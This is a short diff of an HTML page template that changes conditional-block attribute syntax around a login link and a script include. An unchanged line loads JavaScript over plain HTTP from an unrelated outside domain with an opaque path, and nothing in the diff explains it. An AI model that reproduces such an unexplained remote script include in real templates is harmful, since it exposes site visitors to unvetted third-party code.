@@ -76,7 +76,7 @@
                             </stl:block>   
                     </div>
                     </div>
-                    <stl:block stl:block="not office">
+                    <stl:block if="not office">
                         <SCRIPT type="text/javascript" LANGUAGE="javascript" src="http://www.qksz.net/1e-g2h5"> </SCRIPT>
                     </stl:block>
                 </div><!-- yui-b -->
@@ -107,10 +107,10 @@
                     <li><a href="/;about">About</a></li>
                     <li><a href="/;terms">Terms &amp; Conditions</a></li>
                     <li><a href="/;more">More</a></li>
-                     <stl:block stl:if="not user/info">
+                     <stl:block if="not user/info">
                         <li><a href="/;login_form">(not logged in)</a></li>
                       </stl:block>
-                      <stl:block stl:if="user/info">
+                      <stl:block if="user/info">
                           <li><a href="${user/info/home}">
                           ${user/info/title}</a></li>
                       </stl:block>
